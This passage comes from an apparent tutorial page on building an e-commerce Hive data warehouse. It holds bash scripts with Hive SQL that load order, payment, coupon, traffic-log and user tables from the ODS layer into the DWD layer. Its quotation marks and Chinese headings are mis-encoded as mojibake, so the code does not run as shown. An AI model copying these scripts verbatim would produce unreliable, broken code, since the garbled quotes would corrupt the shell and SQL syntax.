ri.refund_reason_type=reason_dic.dic_code;</p><p>â€œ</p><p>dwd_trade_pay_detail_suc_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_pay_detail_suc_inc partition (dt)</p><p>select</p><p>od.id,</p><p>od.order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>payment_type,</p><p>pay_dic.dic_name,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>callback_time,</p><p>source_id,</p><p>source_type,</p><p>src_dic.dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.user_id,</p><p>data.order_id,</p><p>data.payment_type,</p><p>data.callback_time</p><p>from ${APP}.ods_payment_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>and data.payment_status=â€™1602â€™</p><p>) pi</p><p>on od.order_id=pi.order_id</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™11â€™</p><p>) pay_dic</p><p>on pi.payment_type=pay_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™24â€™</p><p>)src_dic</p><p>on od.source_type=src_dic.dic_code;</p><p>â€œ</p><p>dwd_trade_refund_pay_suc_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_refund_pay_suc_inc partition(dt)</p><p>select</p><p>rp.id,</p><p>user_id,</p><p>rp.order_id,</p><p>rp.sku_id,</p><p>province_id,</p><p>payment_type,</p><p>dic_name,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>callback_time,</p><p>refund_num,</p><p>total_amount,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.payment_type,</p><p>data.callback_time,</p><p>data.total_amount</p><p>from ${APP}.ods_refund_payment_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>and data.refund_status=â€™1602â€™</p><p>)rp</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)oi</p><p>on rp.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_num</p><p>from ${APP}.ods_order_refund_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)ri</p><p>on rp.order_id=ri.order_id</p><p>and rp.sku_id=ri.sku_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™11â€™</p><p>)dic</p><p>on rp.payment_type=dic.dic_code;</p><p>â€œ</p><p>dwd_traffic_action_inc=â€</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_action_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>action_id,</p><p>action_item,</p><p>action_item_type,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) action_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>action.action_id,</p><p>action.item action_item,</p><p>action.item_type action_item_type,</p><p>action.ts</p><p>from ${APP}.ods_log_inc lateral view explode(actions) tmp as action</p><p>where dt=â€™$do_dateâ€™</p><p>and actions is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_traffic_display_inc=â€</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_display_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) display_time,</p><p>display_type,</p><p>display_item,</p><p>display_item_type,</p><p>display_order,</p><p>display_pos_id</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>display.display_type,</p><p>display.item display_item,</p><p>display.item_type display_item_type,</p><p>display.\`order\` display_order,</p><p>display.pos_id display_pos_id,</p><p>ts</p><p>from ${APP}.ods_log_inc lateral view explode(displays) tmp as display</p><p>where dt=â€™$do_dateâ€™</p><p>and displays is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_traffic_error_inc=â€</p><p>set hive.cbo.enable=false;</p><p>set hive.execution.engine=mr;</p><p>insert overwrite table ${APP}.dwd_traffic_error_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>entry,</p><p>loading_time,</p><p>open_ad_id,</p><p>open_ad_ms,</p><p>open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) error_time,</p><p>error_code,</p><p>error_msg</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>\`start\`.entry,</p><p>\`start\`.loading_time,</p><p>\`start\`.open_ad_id,</p><p>\`start\`.open_ad_ms,</p><p>\`start\`.open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>err.error_code,</p><p>err.msg error_msg,</p><p>ts</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and err is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>set hive.execution.engine=spark;</p><p>â€œ</p><p>dwd_traffic_page_view_inc=â€</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_page_view_inc partition<br>(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) view_time,</p><p>concat(mid_id,â€™-â€˜,last_value(session_start_point,true) over (partition by mid_id<br>order by ts)) session_id,</p><p>during_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and page is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_traffic_start_inc=â€</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_start_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>entry,</p><p>open_ad_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) action_time,</p><p>loading_time,</p><p>open_ad_ms,</p><p>open_ad_skip_ms</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>\`start\`.entry,</p><p>\`start\`.loading_time,</p><p>\`start\`.open_ad_id,</p><p>\`start\`.open_ad_ms,</p><p>\`start\`.open_ad_skip_ms,</p><p>ts</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and \`start\` is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_user_login_inc=â€</p><p>insert overwrite table ${APP}.dwd_user_login_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) login_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>row_number() over (partition by session_id order by ts) rn</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>concat(mid_id,â€™-â€˜,last_value(session_start_point,true) over(partition by mid_id<br>order by ts)) session_id</p><p>from</p><p>(</p><p>select</p><p>common.uid user_id,</p><p>common.ch channel,</p><p>common.ar area_code,</p><p>common.vc version_code,</p><p>common.mid mid_id,</p><p>common.ba brand,</p><p>common.md model,</p><p>common.os operate_system,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and page is not null</p><p>)t1</p><p>)t2</p><p>where user_id is not null</p><p>)t3</p><p>where rn=1</p><p>)t4</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on t4.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_user_register_inc=â€</p><p>insert overwrite table ${APP}.dwd_user_register_inc partition(dt)</p><p>select</p><p>ui.user_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id user_id,</p><p>data.create_time</p><p>from ${APP}.ods_user_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)ui</p><p>left join</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and page.page_id=â€™registerâ€™</p><p>and common.uid is not null</p><p>)log</p><p>on ui.user_id=log.user_id</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>case $1 in</p><p>â€œdwd_interaction_comment_incâ€ )</p><p>hive -e â€œ$dwd_interaction_comment_incâ€</p><p>;;</p><p>â€œdwd_interaction_favor_add_incâ€ )</p><p>hive -e â€œ$dwd_interaction_favor_add_incâ€</p><p>;;</p><p>â€œdwd_tool_coupon_get_incâ€ )</p><p>hive -e â€œ$dwd_tool_coupon_get_incâ€</p><p>;;</p><p>â€œdwd_tool_coupon_order_incâ€ )</p><p>hive -e â€œ$dwd_tool_coupon_order_incâ€</p><p>;;</p><p>â€œdwd_tool_coupon_pay_incâ€ )</p><p>hive -e â€œ$dwd_tool_coupon_pay_incâ€</p><p>;;</p><p>â€œdwd_trade_cancel_detail_incâ€ )</p><p>hive -e â€œ$dwd_trade_cancel_detail_incâ€</p><p>;;</p><p>â€œdwd_trade_cart_add_incâ€ )</p><p>hive -e â€œ$dwd_trade_cart_add_incâ€</p><p>;;</p><p>â€œdwd_trade_cart_fullâ€ )</p><p>hive -e â€œ$dwd_trade_cart_fullâ€</p><p>;;</p><p>â€œdwd_trade_order_detail_incâ€ )</p><p>hive -e â€œ$dwd_trade_order_detail_incâ€</p><p>;;</p><p>â€œdwd_trade_order_refund_incâ€ )</p><p>hive -e â€œ$dwd_trade_order_refund_incâ€</p><p>;;</p><p>â€œdwd_trade_pay_detail_suc_incâ€ )</p><p>hive -e â€œ$dwd_trade_pay_detail_suc_incâ€</p><p>;;</p><p>â€œdwd_trade_refund_pay_suc_incâ€ )</p><p>hive -e â€œ$dwd_trade_refund_pay_suc_incâ€</p><p>;;</p><p>â€œdwd_traffic_action_incâ€ )</p><p>hive -e â€œ$dwd_traffic_action_incâ€</p><p>;;</p><p>â€œdwd_traffic_display_incâ€ )</p><p>hive -e â€œ$dwd_traffic_display_incâ€</p><p>;;</p><p>â€œdwd_traffic_error_incâ€ )</p><p>hive -e â€œ$dwd_traffic_error_incâ€</p><p>;;</p><p>â€œdwd_traffic_page_view_incâ€ )</p><p>hive -e â€œ$dwd_traffic_page_view_incâ€</p><p>;;</p><p>â€œdwd_traffic_start_incâ€ )</p><p>hive -e â€œ$dwd_traffic_start_incâ€</p><p>;;</p><p>â€œdwd_user_login_incâ€ )</p><p>hive -e â€œ$dwd_user_login_incâ€</p><p>;;</p><p>â€œdwd_user_register_incâ€ )</p><p>hive -e â€œ$dwd_user_register_incâ€</p><p>;;</p><p>â€œallâ€ )</p><p>hive -e<br>â€œ$dwd_interaction_comment_inc$dwd_interaction_favor_add_inc$dwd_tool_coupon_get_inc$dwd_tool_coupon_order_inc$dwd_tool_coupon_pay_inc$dwd_trade_cancel_detail_inc$dwd_trade_cart_add_inc$dwd_trade_cart_full$dwd_trade_order_detail_inc$dwd_trade_order_refund_inc$dwd_trade_pay_detail_suc_inc$dwd_trade_refund_pay_suc_inc$dwd_traffic_action_inc$dwd_traffic_display_inc$dwd_traffic_error_inc$dwd_traffic_page_view_inc$dwd_traffic_start_inc$dwd_user_login_inc$dwd_user_register_incâ€</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x ods_to_dwd_init.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ ods_to_dwd_init.sh all 2020-06-14</p><h4 id="æ¯æ—¥è£…è½½è„šæœ¬-1"><a href="#æ¯æ—¥è£…è½½è„šæœ¬-1" class="headerlink" title="æ¯æ—¥è£…è½½è„šæœ¬"></a>æ¯æ—¥è£…è½½è„šæœ¬</h4><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºods_to_dwd.sh</p><p>[atguigu@hadoop102 bin]$ vim ods_to_dwd.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## å¦‚æœæ˜¯è¾“å…¥çš„æ—¥æœŸæŒ‰ç…§å–è¾“å…¥æ—¥æœŸï¼›å¦‚æœæ²¡è¾“å…¥æ—¥æœŸå–å½“å‰æ—¶é—´çš„å‰ä¸€å¤©</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d â€œ-1 dayâ€ +%F`</p><p>fi</p><p>dwd_interaction_comment_inc=â€</p><p>insert overwrite table ${APP}.dwd_interaction_comment_inc<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>order_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>appraise,</p><p>dic_name</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.order_id,</p><p>data.create_time,</p><p>data.appraise</p><p>from ${APP}.ods_comment_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™insertâ€™</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™12â€™</p><p>)dic</p><p>on ci.appraise=dic.dic_code;</p><p>â€œ</p><p>dwd_interaction_favor_add_inc=â€</p><p>insert overwrite table ${APP}.dwd_interaction_favor_add_inc<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(data.create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.create_time</p><p>from ${APP}.ods_favor_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type = â€˜insertâ€™;</p><p>â€œ</p><p>dwd_tool_coupon_get_inc=â€</p><p>insert overwrite table ${APP}.dwd_tool_coupon_get_inc partition<br>(dt=â€™$do_dateâ€™)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>date_format(data.get_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.get_time</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™insertâ€™;</p><p>â€œ</p><p>dwd_tool_coupon_order_inc=â€</p><p>insert overwrite table ${APP}.dwd_tool_coupon_order_inc<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.using_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.using_time</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™updateâ€™</p><p>and array_contains(map_keys(old),â€™using_timeâ€™);</p><p>â€œ</p><p>dwd_tool_coupon_pay_inc=â€</p><p>insert overwrite table ${APP}.dwd_tool_coupon_pay_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.used_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>data.used_time</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™updateâ€™</p><p>and array_contains(map_keys(old),â€™used_timeâ€™);</p><p>â€œ</p><p>dwd_trade_cancel_detail_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_cancel_detail_inc partition<br>(dt=â€™$do_dateâ€™)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(canel_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>canel_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where (dt=â€™$do_dateâ€™ or dt=date_add(â€˜$do_dateâ€™,-1))</p><p>and (type = â€˜insertâ€™ or type= â€˜bootstrap-insertâ€™)</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id,</p><p>data.operate_time canel_time</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜updateâ€™</p><p>and data.order_status=â€™1003â€™</p><p>and array_contains(map_keys(old),â€™order_statusâ€™)</p><p>) oi</p><p>on order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where (dt=â€™$do_dateâ€™ or dt=date_add(â€˜$do_dateâ€™,-1))</p><p>and (type = â€˜insertâ€™ or type= â€˜bootstrap-insertâ€™)</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where (dt=â€™$do_dateâ€™ or dt=date_add(â€˜$do_dateâ€™,-1))</p><p>and (type = â€˜insertâ€™ or type= â€˜bootstrap-insertâ€™)</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p>â€œ</p><p>dwd_trade_cart_add_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_cart_add_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type_code,</p><p>source_type_name,</p><p>sku_num</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(from_utc_timestamp(ts*1000,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts*1000,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™)<br>create_time,</p><p>data.source_id,</p><p>data.source_type source_type_code,</p><p>if(type=â€™insertâ€™,data.sku_num,data.sku_num-old[â€˜sku_numâ€™]) sku_num</p><p>from ${APP}.ods_cart_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and (type=â€™insertâ€™</p><p>or(type=â€™updateâ€™ and old[â€˜sku_numâ€™] is not null and<br>data.sku_num&gt;cast(old[â€˜sku_numâ€™] as int)))</p><p>)cart</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name source_type_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on cart.source_type_code=dic.dic_code;</p><p>â€œ</p><p>dwd_trade_cart_full=â€</p><p>insert overwrite table ${APP}.dwd_trade_cart_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>sku_num</p><p>from ${APP}.ods_cart_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>and is_ordered=â€™0â€™;</p><p>â€œ</p><p>dwd_trade_order_detail_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_order_detail_inc partition<br>(dt=â€™$do_dateâ€™)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>date_format(data.create_time, â€˜yyyy-MM-ddâ€™) date_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜insertâ€™</p><p>) od</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜insertâ€™</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜insertâ€™</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from 